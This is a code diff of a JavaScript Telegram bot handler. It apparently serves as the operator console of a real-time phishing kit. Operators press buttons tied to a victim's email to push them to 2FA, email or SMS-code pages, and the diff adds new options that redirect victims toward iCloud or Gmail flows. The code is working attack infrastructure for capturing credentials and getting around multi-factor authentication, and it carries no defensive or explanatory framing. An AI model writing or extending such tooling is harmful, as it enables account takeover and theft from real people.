@@ -31,12 +31,15 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
 
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, status: action })
+      body: JSON.stringify({
+        email,
+        status: action
+      })
     });
 
     // Also handle SMS status updates
@@ -45,6 +48,15 @@ bot.on("callback_query", async (query) => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, status: action })
+      });
+    }
+
+    // Handle redirection choices
+    if (action.includes("redirect_")) {
+      await fetch(`${APP_URL}/update-redirection-choice`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, choice: action })
       });
     }
 
@@ -73,6 +85,10 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
         statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
+      } else if (action === "redirect_icloud") {
+        statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
+      } else if (action === "redirect_gmail") {
+        statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
       } else if (action === "reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
